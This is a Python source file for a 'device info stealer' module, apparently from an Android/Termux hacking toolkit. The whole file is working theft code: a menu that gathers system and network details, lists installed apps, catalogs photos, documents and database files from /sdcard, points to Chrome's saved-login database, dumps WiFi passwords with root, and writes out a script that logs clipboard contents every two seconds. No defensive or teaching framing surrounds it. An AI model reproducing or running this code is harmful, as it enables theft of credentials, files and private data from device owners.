#!/usr/bin/env python3
import sys, os, platform, socket, subprocess, json
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

@auth_required
def run_stealer():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║        DEVICE INFO STEALER MODULE                     ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] Full System Recon")
    print("[2] Network Information")
    print("[3] Installed Apps")
    print("[4] File Harvester")
    print("[5] Browser Credentials")
    print("[6] WiFi Passwords")
    print("[7] Clipboard Stealer")
    choice = input("\n[STEALER] Select: ").strip()
    if choice == "1":
        info = {
            "platform": platform.platform(),
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "python": platform.python_version(),
            "cwd": os.getcwd(),
            "home": os.path.expanduser("~")
        }
        try:
            r = subprocess.run(["cat", "/proc/cpuinfo"], capture_output=True, text=True)
            info["cpuinfo"] = r.stdout[:2000]
        except:
            pass
        try:
            r = subprocess.run(["cat", "/proc/meminfo"], capture_output=True, text=True)
            info["meminfo"] = r.stdout[:2000]
        except:
            pass
        with open("device_info.json", "w") as f:
            json.dump(info, f, indent=2)
        print("[STEALER] Saved to device_info.json")
        for k, v in info.items():
            if k not in ["cpuinfo", "meminfo"]:
                print("    " + k + ": " + str(v))
        log_action("STEALER", "Full system recon")
    elif choice == "2":
        try:
            r = subprocess.run(["ifconfig"], capture_output=True, text=True)
            print(r.stdout[:3000])
        except:
            try:
                r = subprocess.run(["ip", "addr"], capture_output=True, text=True)
                print(r.stdout[:3000])
            except:
                print("    IP: " + socket.gethostbyname(socket.gethostname()))
        log_action("STEALER", "Network info")
    elif choice == "3":
        try:
            r = subprocess.run(["pm", "list", "packages"], capture_output=True, text=True)
            apps = r.stdout.strip().split("\n")
            print("[STEALER] Found " + str(len(apps)) + " apps")
            for a in apps[:50]:
                print("    " + a)
            with open("installed_apps.txt", "w") as f:
                f.write(r.stdout)
        except:
            print("[STEALER] Requires Android/Termux")
        log_action("STEALER", "Apps list")
    elif choice == "4":
        path = input("[STEALER] Directory (default /sdcard/): ").strip() or "/sdcard/"
        harvested = []
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith((".jpg", ".png", ".pdf", ".doc", ".txt", ".db", ".xml")):
                    harvested.append(os.path.join(root, file))
                    if len(harvested) >= 100:
                        break
            if len(harvested) >= 100:
                break
        with open("harvested_files.txt", "w") as f:
            f.write("\n".join(harvested))
        print("[STEALER] " + str(len(harvested)) + " files cataloged")
        log_action("STEALER", "File harvest from " + path)
    elif choice == "5":
        print("[STEALER] Chrome: ~/.config/google-chrome/Default/Login Data")
        print("[STEALER] Use sqlite3 to extract")
        log_action("STEALER", "Browser creds")
    elif choice == "6":
        try:
            r = subprocess.run(["su", "-c", "cat /data/misc/wifi/wpa_supplicant.conf"], capture_output=True, text=True)
            print(r.stdout)
            with open("wifi_passwords.txt", "w") as f:
                f.write(r.stdout)
        except:
            print("[STEALER] Requires root")
        log_action("STEALER", "WiFi passwords")
    elif choice == "7":
        lines = [
            "import subprocess,time",
            "while True:",
            "    try:",
            "        r=subprocess.run(['termux-clipboard-get'],capture_output=True,text=True)",
            "        if r.stdout.strip():",
            "            with open('clipboard_log.txt','a') as f: f.write(str(time.time())+': '+r.stdout+'\n')",
            "            print('[CLIPBOARD] '+r.stdout.strip())",
            "    except: pass",
            "    time.sleep(2)"
        ]
        with open("clipboard_stealer.py", "w") as f:
            f.write("\n".join(lines))
        print("[STEALER] Clipboard stealer saved")
        log_action("STEALER", "Clipboard stealer")
